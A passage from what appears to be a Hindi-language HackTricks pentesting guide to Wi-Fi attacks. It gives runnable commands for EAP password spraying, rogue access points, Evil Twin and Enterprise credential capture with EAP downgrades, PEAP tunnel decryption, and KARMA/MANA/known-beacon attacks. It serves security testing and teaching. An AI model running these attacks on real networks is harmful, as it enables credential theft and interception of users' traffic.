- यदि परिनियोजन bare EAP‑SIM/AKA का उपयोग करता है और सुरक्षित पहचान/उपनाम नहीं है, तो यह किसी भी TLS टनल से पहले काम करता है।
- उद्घाटित मान एक स्थायी पहचानकर्ता है जो सब्सक्राइबर के SIM से जुड़ा होता है; इसे इकट्ठा करने से दीर्घकालिक ट्रैकिंग और बाद में होने वाले telecom दुरुपयोग संभव हो जाते हैं।

प्रभाव
- गोपनीयता: सार्वजनिक स्थानों में निष्क्रिय Wi‑Fi कैप्चर से उपयोगकर्ता/डिवाइस की स्थायी ट्रैकिंग।
- Telecom abuse bootstrap: IMSI के साथ, SS7/Diameter एक्सेस वाला एक हमलावर लोकेशन क्वेरी कर सकता है या कॉल/SMS इंटरसेप्शन और MFA चोरी का प्रयास कर सकता है।

रोकथाम / क्या देखें
- सत्यापित करें कि क्लाइंट EAP‑SIM/AKA के लिए anonymous outer identities (pseudonyms) का उपयोग करते हैं जैसा कि 3GPP मार्गदर्शन में बताया गया है (उदा., 3GPP TS 33.402)।
- पहचान चरण का tunneling करना वरीयता दें (उदा., EAP‑TTLS/PEAP जो inner EAP‑SIM/AKA ले जाता है), ताकि IMSI कभी स्पष्ट रूप में न भेजा जाए।
- association/auth के packet captures कभी भी EAP-Response/Identity में कच्चा IMSI प्रकट न करें।

संबंधित: कैप्चर किए गए मोबाइल पहचानकर्ताओं के साथ Telecom signalling का दुरुपयोग
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

यदि क्लाइंट से उम्मीद की जाती है कि वह **username and password** का उपयोग करेगा (ध्यान दें कि इस मामले में **EAP-TLS won't be valid**), तो आप **usernames** की एक **list** (अगले हिस्से को देखें) और **passwords** हासिल करके [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer) का उपयोग करके access को **bruteforce** करने की कोशिश कर सकते हैं।
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
आप यह attack `eaphammer` का उपयोग करके भी कर सकते हैं:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client attacks सिद्धांत

### Network Selection and Roaming

- 802.11 protocol यह परिभाषित करता है कि एक station किस तरह से एक Extended Service Set (ESS) में जुड़ता है, लेकिन यह ESS या उसके भीतर किसी access point (AP) के चयन के मापदंडों को निर्दिष्ट नहीं करता।
- Stations एक ही ESSID साझा करने वाले APs के बीच roam कर सकते हैं, एक इमारत या क्षेत्र में connectivity बनाए रखते हुए।
- प्रोटोकॉल station से ESS के लिए authentication की मांग करता है लेकिन AP से station के प्रति authentication को अनिवार्य नहीं बनाता।

### Preferred Network Lists (PNLs)

- Stations अपने Preferred Network List (PNL) में हर उस wireless network का ESSID स्टोर करते हैं जिससे वे connect हुए हैं, साथ ही network-specific configuration विवरण भी।
- PNL का उपयोग ज्ञात नेटवर्क्स से स्वचालित रूप से connect करने के लिए किया जाता है, जिससे connection प्रक्रिया सरल होकर उपयोगकर्ता का अनुभव बेहतर होता है।

### Passive Scanning

- APs समय-समय पर beacon frames broadcast करते हैं, अपनी उपस्थिति और सुविधाओं की घोषणा करते हुए, जिसमें AP का ESSID भी शामिल होता है जब तक कि broadcasting disabled न हो।
- Passive scanning के दौरान stations beacon frames के लिए सुनते हैं। यदि किसी beacon का ESSID station की PNL में किसी entry से मेल खाता है, तो station स्वचालित रूप से उस AP से connect कर सकता है।
- किसी डिवाइस की PNL का ज्ञान संभावित exploitation की अनुमति देता है — एक ज्ञात नेटवर्क के ESSID को नकल करके (mimicking), डिवाइस को rogue AP से जुड़ने के लिए trick किया जा सकता है।

### Active Probing

- Active probing में stations probe requests भेजते हैं ताकि नजदीकी APs और उनकी characteristics का पता चल सके।
- Directed probe requests किसी विशेष ESSID को target करते हैं, जो यह पता लगाने में मदद करता है कि कोई खास नेटवर्क range में है या नहीं, भले ही वह hidden network हो।
- Broadcast probe requests में null SSID field होता है और ये सभी नज़दीकी APs को भेजे जाते हैं, जिससे station किसी भी preferred network के लिए जाँच कर सकता है बिना अपनी PNL की सामग्री प्रकट किए।

## Simple AP को Internet पर redirect करना

ज्यादा जटिल attacks कैसे perform किए जाते हैं यह समझाने से पहले यह बताया जाएगा कि **how** सिर्फ़ एक **AP** को **create** करना और उसके **traffic** को किसी interface जो **Internet** से connected हो, उस पर **redirect** कैसे करना है।

Using `ifconfig -a` जांच करें कि AP बनाने के लिए जो wlan interface है और जो interface Internet से connected है वे मौजूद हैं।

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
कॉन्फ़िग फ़ाइल बनाएँ `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
फिर **set IPs** और **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
और फिर **start** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
एक config फ़ाइल बनाएँ `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**परेशान करने वाली प्रक्रियाओं को बंद करें** , सेट **monitor mode**, और **hostapd शुरू करें**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### फॉरवर्डिंग और रीडायरेक्शन
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack WiFi clients के द्वारा नेटवर्क पहचानने के तरीके का फायदा उठाता है; यह मुख्यतः नेटवर्क नाम (ESSID) पर निर्भर करता है और base station (access point) को client के सामने authenticate करने की आवश्यकता नहीं होती। मुख्य बिंदु:

- **Difficulty in Differentiation**: Devices को legitimate और rogue access points में फर्क करने में परेशानी होती है जब वे same ESSID और encryption type साझा करते हैं। वास्तविक दुनिया के नेटवर्क अक्सर seamless coverage बढ़ाने के लिए एक ही ESSID वाले कई access points का उपयोग करते हैं।
- **Client Roaming and Connection Manipulation**: 802.11 protocol devices को same ESS के भीतर access points के बीच roam करने की अनुमति देता है। Attackers इसका फायदा उठाकर device को उसके current base station से disconnect करवा कर rogue access point से connect करा सकते हैं। यह या तो stronger signal देकर या legitimate access point के connection को deauthentication packets या jamming जैसी methods से disrupt करके किया जा सकता है।
- **Challenges in Execution**: multiple, well-placed access points वाले वातावरण में सफलतापूर्वक एक evil twin attack करना चुनौतीपूर्ण हो सकता है। किसी एक legitimate access point को deauthenticate करने पर अक्सर device किसी अन्य legitimate access point से connect कर लेता है, जब तक attacker सभी nearby access points को deauthenticate न कर सके या rogue access point को रणनीतिक रूप से न रखे।

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
आप **eaphammer** का उपयोग करके भी एक Evil Twin बना सकते हैं (ध्यान दें कि eaphammer के साथ evil twins बनाने के लिए interface **should NOT be** in **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
या Airgeddon का उपयोग करते हुए: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

कृपया ध्यान दें कि डिफ़ॉल्ट रूप से अगर PNL में किसी ESSID को WPA protected के रूप में सेव किया गया है, तो डिवाइस अपने आप किसी Open evil Twin से कनेक्ट नहीं करेगा। आप असली AP पर DoS करके कोशिश कर सकते हैं और उम्मीद कर सकते हैं कि उपयोगकर्ता मैन्युअली आपके Open evil Twin से कनेक्ट कर लेगा, या आप असली AP पर DoS कर के WPA Evil Twin का उपयोग कर handshake कैप्चर कर सकते हैं (इस तरीके का उपयोग करते समय आप पीड़ित को अपने पास कनेक्ट होने देने में सक्षम नहीं होंगे क्योंकि आप PSK नहीं जानते, लेकिन आप handshake कैप्चर कर सकते हैं और उसे क्रैक करने की कोशिश कर सकते हैं)।

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

आप **Evil Twin using WPA/2** बना सकते हैं और यदि डिवाइसेज़ उस SSID को WPA/2 से कनेक्ट होने के लिए कॉन्फ़िगर हैं, तो वे कनेक्ट करने की कोशिश करेंगे। हालाँकि, **to complete the 4-way-handshake** करने के लिए आपको क्लाइंट द्वारा उपयोग किया जाने वाला **पासवर्ड** भी **जानना** होगा। यदि आप इसे **जानते नहीं हैं**, तो **कनेक्शन पूरा नहीं होगा**।
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

इन हमलों को समझने के लिए मैं सुझाव दूंगा कि पहले संक्षेप [WPA Enterprise explanation](#wpa-enterprise-mgt) पढ़ लें।

**hostapd-wpe का उपयोग**

`hostapd-wpe` को काम करने के लिए एक **configuration** फ़ाइल की आवश्यकता होती है। इन configuration फ़ाइलों के निर्माण को **automate** करने के लिए आप [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) का उपयोग कर सकते हैं (python फ़ाइल _/etc/hostapd-wpe/_ के अंदर डाउनलोड करें)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
कॉन्फ़िगरेशन फ़ाइल में आप कई अलग-अलग चीज़ें चुन सकते हैं जैसे ssid, channel, user files, cret/key, dh parameters, wpa version और auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Using EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
डिफ़ॉल्ट रूप से, EAPHammer इन authentication methods का उपयोग करता है (ध्यान दें कि GTC सबसे पहले plaintext passwords प्राप्त करने की कोशिश करता है, और फिर अधिक मजबूत auth methods का उपयोग किया जाता है):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
यह डिफ़ॉल्ट मेथोडोलॉजी है ताकि लंबे कनेक्शन समय से बचा जा सके। हालांकि, आप server को authentication methods को weakest से strongest तक भी specify कर सकते हैं:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (प्लेनटेक्स्ट पासवर्ड)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` पहले से जनरेट किए गए certificated का उपयोग कर सकता है ताकि WPA/WPA2-Enterprise नेटवर्क्स को EAP authentication ऑफ़र किया जा सके। फेक नेटवर्क कनेक्शन प्रोटोकॉल को EAP-MD5 पर डाउनग्रेड कर देगा ताकि यह उपयोगकर्ता और पासवर्ड का MD5 **capture** कर सके। बाद में, attacker पासवर्ड को crack करने की कोशिश कर सकता है.\
`Airggedon` आपको **continuous Evil Twin attack (noisy)** या **only create the Evil Attack until someone connects (smooth)** का विकल्प देता है।

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

hostapd-wpe की **configuration** के अंदर _hostapd-wpe_ की उस लाइन को **comment** करें जिसमें _**dh_file**_ होता है (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\  
यह `hostapd-wpe` को **DH** के बजाय **RSA** का उपयोग करके keys exchange करने पर मजबूर करेगा, ताकि आप बाद में सर्वर की private key **जानकर** ट्रैफ़िक को **decrypt** कर सकें।

अब उस modified configuration के साथ सामान्य रूप से **Evil Twin** को **`hostapd-wpe`** का उपयोग कर के स्टार्ट करें। साथ ही, उस **interface** पर **`wireshark`** स्टार्ट करें जो Evil Twin attack कर रहा है।

अब या बाद में (जब आपने कुछ authentication intents capture कर लिए हों) आप private RSA key को wireshark में जोड़ सकते हैं: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

एक नया entry जोड़ें और इस फॉर्म को इन मानों से भरें: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, समस्याओं से बचने के लिए ऐसा key file चुनें जो **without being password protected** हो)।

![](<../../images/image (687).png>)

और नए **"Decrypted TLS" tab** को देखें:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) और उनके संबंधित मोड और एक rogue Access Point (AP) के व्यवहार पर प्रभाव:

1. **MAC-based Whitelist**:
- rogue AP केवल उन devices के probe requests का उत्तर देगा जो whitelist में निर्दिष्ट हैं, और सूची में न होने वाले सभी अन्य के लिए अदृश्य रहेगा।
2. **MAC-based Blacklist**:
- rogue AP उन devices के probe requests को ignore करेगा जो blacklist में हैं, जिससे rogue AP उन विशेष devices के लिए अदृश्य बन जाएगा।
3. **SSID-based Whitelist**:
- rogue AP केवल उन specific ESSIDs के probe requests का उत्तर देगा जो सूची में हैं, जिससे यह उन devices के लिए अदृश्य रहेगा जिनकी Preferred Network Lists (PNLs) में वे ESSIDs नहीं हैं।
4. **SSID-based Blacklist**:
- rogue AP उन specific ESSIDs के probe requests का उत्तर नहीं देगा जो blacklist में हैं, जिससे यह उन devices के लिए अदृश्य बन जाएगा जो उन particular networks की तलाश कर रहे हैं।
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

यह विधि एक **attacker to create a malicious access point (AP) that responds to all probe requests** को सक्षम बनाती है, जो networks से कनेक्ट करने की कोशिश करने वाले devices के probe requests का जवाब देता है। यह technique उन networks की नकल करके **tricks devices into connecting to an attacker's AP**. एक बार जब कोई device इस rogue AP को connection request भेजता है, तो कनेक्शन पूरा हो जाता है और device गलती से attacker के network से जुड़ जाता है।

### MANA

फिर, **devices started to ignore unsolid network responses**, जिससे original karma attack की प्रभावशीलता कम हो गई। हालांकि, Ian de Villiers और Dominic White द्वारा एक नई विधि पेश की गई, जिसे **MANA attack** कहा जाता है। यह विधि rogue AP को सक्षम बनाती है कि वह **capturing the Preferred Network Lists (PNL) from devices by responding to their broadcast probe requests** के जरिए devices के PNL को हासिल करे, उन नेटवर्क नामों (SSIDs) के साथ जो पहले devices द्वारा भरोसेमंद मानी जाती थीं। यह परिष्कृत attack original karma attack के खिलाफ सुरक्षा उपायों को bypass करता है क्योंकि यह devices के known networks को याद करने और प्राथमिकता देने के तरीके का फायदा उठाता है।

MANA attack संचालित होती है devices से आने वाले directed और broadcast probe requests की निगरानी करके। directed requests के लिए, यह device का MAC address और requested network name रिकॉर्ड करती है और इस जानकारी को एक सूची में जोड़ देती है। जब कोई broadcast request प्राप्त होती है, तो AP उस सूची में किसी भी network से मेल खाती जानकारी का जवाब भेजता है, जिससे device rogue AP से जुड़ने के लिए आकर्षित होता है।
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

एक **Loud MANA attack** एक उन्नत रणनीति है जब डिवाइस directed probing का उपयोग नहीं करते या जब उनके Preferred Network Lists (PNL) हमलावर के लिए अज्ञात होते हैं। यह इस सिद्धांत पर काम करता है कि **एक ही क्षेत्र में मौजूद डिवाइस अपने PNLs में कुछ नेटवर्क नाम साझा करने की संभावना रखते हैं**। चयनात्मक रूप से प्रतिक्रिया देने के बजाय, यह attack उन सभी देखी गई डिवाइसों के combined PNLs में पाए गए हर नेटवर्क नाम (ESSID) के लिए probe responses प्रसारित करता है। यह व्यापक तरीका किसी डिवाइस के परिचित नेटवर्क को पहचानने और rogue Access Point (AP) से कनेक्ट करने का प्रयास करने की संभावना बढ़ाता है।
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

जब **Loud MANA attack** पर्याप्त न हो, तो **Known Beacon attack** एक अन्य तरीका प्रस्तुत करता है। यह तरीका **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** जो एक wordlist से निकाली गई हैं। यह कई नेटवर्कों की उपस्थिति का अनुकरण करता है, उम्मीद करते हुए कि victim के PNL में किसी ESSID से मेल मिल जाए और वह fabricated AP से कनेक्ट करने का प्रयास करे। इस attack को और अधिक aggressive बनाने के लिए इसे `--loud` option के साथ जोड़ा जा सकता है ताकि devices को पकड़ने का प्रयास तेज हो सके।

Eaphammer ने इस attack को एक MANA attack के रूप में लागू किया है जहाँ सूची में मौजूद सभी ESSIDs प्रसारित किए जाते हैं (आप इसे `--loud` के साथ जोड़कर एक Loud MANA + Known beacons attack भी बना सकते हैं):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

The **Known Beacon Burst attack** में **rapid-fire broadcasting of beacon frames for each ESSID listed in a file** शामिल है। यह fake networks का एक घना वातावरण बनाता है, जिससे डिवाइसों द्वारा rogue AP से कनेक्ट होने की संभावना काफी बढ़ जाती है — खासकर जब इसे MANA attack के साथ जोड़ा जाए। यह तकनीक गति और मात्रा का इस्तेमाल करके डिवाइसों के network selection mechanisms को ओवरवेल्म कर देती है।
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** एक प्रोटोकॉल है जो उपकरणों को पारंपरिक वायरलेस access point की आवश्यकता के बिना Wi-Fi के माध्यम से सीधे आपस में जुड़ने में सक्षम बनाता है। यह क्षमता विभिन्न Internet of Things (IoT) उपकरणों, जैसे printers और televisions, में इंटीग्रेटेड है और उपकरण-से-उपकरण सीधे संचार की सुविधा देती है। Wi-Fi Direct की एक उल्लेखनीय विशेषता यह है कि कनेक्शन को मैनेज करने के लिए एक डिवाइस access point की भूमिका लेता है, जिसे group owner कहा जाता है।

Security for Wi-Fi Direct connections is established through **Wi-Fi Protected Setup (WPS)**, which supports several methods for secure pairing, including:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

ये तरीके, विशेष रूप से PIN entry, पारंपरिक Wi-Fi नेटवर्क में WPS जैसी ही कमजोरियों के प्रति संवेदनशील हैं, और इन्हें समान attack vectors का लक्ष्य बनाया जा सकता है।

### EvilDirect Hijacking

**EvilDirect Hijacking** Wi-Fi Direct के लिए विशिष्ट एक attack है। यह Evil Twin attack की अवधारणा को प्रतिबिंबित करता है लेकिन Wi-Fi Direct कनेक्शनों को लक्षित करता है। इस परिदृश्य में, एक attacker वैध group owner का impersonate करता है ताकि डिवाइसों को एक malicious entity से connect करने के लिए धोखा दिया जा सके। यह तरीका tools जैसे `airbase-ng` का उपयोग करके निष्पादित किया जा सकता है, जहाँ impersonated device का channel, ESSID, और MAC address specify किया जाता है:

## संदर्भ

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: देखें: [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (Facebook के साथ लॉगिन और कैप्टिव पोर्टल्स में WPA की नकल)

{{#include ../../banners/hacktricks-training.md}}
